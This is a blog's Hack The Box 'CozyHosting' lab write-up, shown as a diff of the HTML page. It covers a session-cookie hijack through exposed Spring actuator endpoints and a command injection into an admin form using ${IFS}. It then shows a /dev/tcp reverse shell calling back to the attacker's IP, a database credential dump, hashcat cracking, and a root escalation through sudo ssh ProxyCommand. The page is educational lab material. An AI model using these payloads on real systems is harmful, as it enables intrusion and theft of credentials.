@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="#NmapLet’s run an Nmap scan to discover any open ports on the remote host.sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan 1234567891011121314151617Nmap scan report for 10.10.11.230Host is">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-CozyHosting">
+<meta property="og:url" content="https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/index.html">
+<meta property="og:site_name" content="Panosoiko Blog">
+<meta property="og:description" content="#NmapLet’s run an Nmap scan to discover any open ports on the remote host.sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan 1234567891011121314151617Nmap scan report for 10.10.11.230Host is">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(cookie).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Adm_Pan).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Form).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Form_Curl).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Callback).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Form_Shell).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Shell_App).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Tables).png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(Hashcat).png">
+<meta property="article:published_time" content="2024-10-31T15:03:30.000Z">
+<meta property="article:modified_time" content="2024-10-31T15:16:01.627Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/CozyHosting/Ch(cookie).png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-CozyHosting</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&text=HTB-CozyHosting"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&is_video=false&description=HTB-CozyHosting"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-CozyHosting&body=Check out this article: https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&name=HTB-CozyHosting&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&t=HTB-CozyHosting"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">#Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Webiste"><span class="toc-number">2.</span> <span class="toc-text">#Webiste</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Endoint-actuator-sessions"><span class="toc-number">3.</span> <span class="toc-text">#Endoint &#x2F;actuator&#x2F;sessions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Admin-Dashboard"><span class="toc-number">4.</span> <span class="toc-text">#Admin Dashboard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">5.</span> <span class="toc-text">#Lateral Movement</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cracking-The-hash"><span class="toc-number">6.</span> <span class="toc-text">#Cracking The hash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">#Privilege Escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-CozyHosting
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-31T15:03:30.000Z" class="dt-published" itemprop="datePublished">2024-10-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="#Nmap"></a>#Nmap</h1><p>Let’s run an Nmap scan to discover any open ports on the remote host.<br><code>sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.230</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5.0</span><br><span class="line">OS details: Linux 5.0</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>Nmap shows that there are 2 ports open <code>22</code> and <code>80</code>. Also the domain is <code>cozyhosting.htb</code><br>so we add the domain to our <code>/etc/hosts</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.230 cozyhosting.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h1 id="Webiste"><a href="#Webiste" class="headerlink" title="#Webiste"></a>#Webiste</h1><p>Login page <a target="_blank" rel="noopener" href="http://cozyhosting.htb/login">http://cozyhosting.htb/login</a></p>
+<p>After running <code>dirsearch -u http://cozyhosting.htb/&quot;</code> we found an endpoint<br><a target="_blank" rel="noopener" href="http://cozyhosting.htb/actuator">http://cozyhosting.htb/actuator</a></p>
+<p>The endpoint revealed some good info<br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/sessions">http://localhost:8080/actuator/sessions</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/health">http://localhost:8080/actuator/health</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/health/%7B*path%7D">http://localhost:8080/actuator/health/{*path}</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/env">http://localhost:8080/actuator/env</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/env/%7BtoMatch%7D">http://localhost:8080/actuator/env/{toMatch}</a><br><a target="_blank" rel="noopener" href="http://localhost:8080/actuator/mappings">http://localhost:8080/actuator/mappings</a></p>
+<h1 id="Endoint-actuator-sessions"><a href="#Endoint-actuator-sessions" class="headerlink" title="#Endoint &#x2F;actuator&#x2F;sessions"></a>#Endoint &#x2F;actuator&#x2F;sessions</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DAD1A0B9921669A3828FC1BE56330CBD&quot;:&quot;kanderson&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>The <code>DAD1A0B9921669A3828FC1BE56330CBD</code> is the cookie for kanderson so we can change our cookie and hijack the session. After we change the cookie we can go to the &#x2F;admin panel (we can find it from the &#x2F;actuator&#x2F;mappings endpoint)</p>
+<p><img src="/images/CozyHosting/Ch(cookie).png" alt="Cookie"></p>
+<h1 id="Admin-Dashboard"><a href="#Admin-Dashboard" class="headerlink" title="#Admin Dashboard"></a>#Admin Dashboard</h1><p><img src="/images/CozyHosting/Ch(Adm_Pan).png" alt="Adm_Panel"></p>
+<p>At the bottom of the page we see a form that require’s a hostname and username for<br>automatic patching. We try to submit hostname as <code>127.0.0.1</code> and username as <code>test</code> but we get an error “Host key verification failed.”</p>
+<p><img src="/images/CozyHosting/Ch(Form).png" alt="Form"></p>
+<p>Probably this means that a service attempts to use ssh to connect to the hostname and username we provide above. As we don’t need to provide any passwords it uses a id_rsa so the command that the service runs is “ssh -i id_rsa username@hostname”</p>
+<p>After some testing I found out that the username does not allow spaces but we can use ${IFS} to bypass that. A simple way to see if the command injection works it to curl a python server that we will host</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p>Then we will try to curl our python server and see if we get a callback<br><code>test;curl$&#123;IFS&#125;http://10.10.14.15:8888;</code></p>
+<p><img src="/images/CozyHosting/Ch(Form_Curl).png" alt="Curl Form"><br><img src="/images/CozyHosting/Ch(Callback).png" alt="Call_Back"></p>
+<p>Now we can generate a shell and upload it to the machine</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\nsh -i &gt;&amp; /dev/tcp/10.10.14.15/1234 0&gt;&amp;1&#x27; &gt; rev.sh</span><br></pre></td></tr></table></figure>
+
+<p>after creating the rev.sh and our python server is running we start out netcat listener</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CozyHosting/Ch(Form_Shell).png" alt="Curl_Shell"></p>
+<p>And we execute a curl command pointing to the rev.sh we created<br>We got a shell, we can upgrade our shell with running</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CozyHosting/Ch(Shell_App).png" alt="Shell_APP"></p>
+<h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="#Lateral Movement"></a>#Lateral Movement</h1><p>We extract the .jar to tmp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -d /tmp/app cloudhosting-0.0.1.jar</span><br></pre></td></tr></table></figure>
+<p>Inside there after some searching around we can find a application.properties that reveals credentials for a postgresql database.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=127.0.0.1</span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = true</span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>
+
+<p>We can see that a postgresql is running on 5432 and we have creds <code>postgres:Vg&amp;nvzAQ7XxR</code>. Using the command <code>psql -h 127.0.0.1 -U postgres</code> to log in we use <code>\list</code> to list all of the database and we see a <code>cozyhosting</code> that looks interesting so we connect to it</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\connect cozyhosting</span><br></pre></td></tr></table></figure>
+<p>There are 2 tables one with users and one with hosts we use a simple command to dump the users table.</p>
+<p><img src="/images/CozyHosting/Ch(Tables).png" alt="Tables"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p>The admin hash is <code>$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code></p>
+<h1 id="Cracking-The-hash"><a href="#Cracking-The-hash" class="headerlink" title="#Cracking The hash"></a>#Cracking The hash</h1><p>To identify the hash we use <code>hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code> or <code>hash-identifier</code> the hash it a bcrypt so after looking for the correct hashcat mode<br>we save the hash into a file and use hashcat with mode <code>3200</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CozyHosting/Ch(Hashcat).png" alt="Hashcat"><br>The hash cracked to <code>manchesterunited</code> and in the home directory we have seen a user <code>josh</code> so we will try to ssh with josh and <code>manchesterunited</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh josh@10.10.11.230</span><br></pre></td></tr></table></figure>
+<p>the flag is on <code>/home/josh/user.txt</code></p>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="#Privilege Escalation"></a>#Privilege Escalation</h1><p>We run <code>sudo -l</code> and provided the <code>manchesterunited</code> as password and we see that we can execute the <code>/usr/bin/ssh</code> with sudo.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br><span class="line">with root priv </span><br></pre></td></tr></table></figure>
+<p>After a quick search on gtfo bins <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a> we found that we can run:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure>
+<p>and get a root shell, the flag is on <code>/root/root.txt</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">#Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Webiste"><span class="toc-number">2.</span> <span class="toc-text">#Webiste</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Endoint-actuator-sessions"><span class="toc-number">3.</span> <span class="toc-text">#Endoint &#x2F;actuator&#x2F;sessions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Admin-Dashboard"><span class="toc-number">4.</span> <span class="toc-text">#Admin Dashboard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">5.</span> <span class="toc-text">#Lateral Movement</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cracking-The-hash"><span class="toc-number">6.</span> <span class="toc-text">#Cracking The hash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">#Privilege Escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&text=HTB-CozyHosting"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&is_video=false&description=HTB-CozyHosting"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-CozyHosting&body=Check out this article: https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&title=HTB-CozyHosting"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&name=HTB-CozyHosting&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2024/10/31/HTB-CozyHosting/&t=HTB-CozyHosting"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
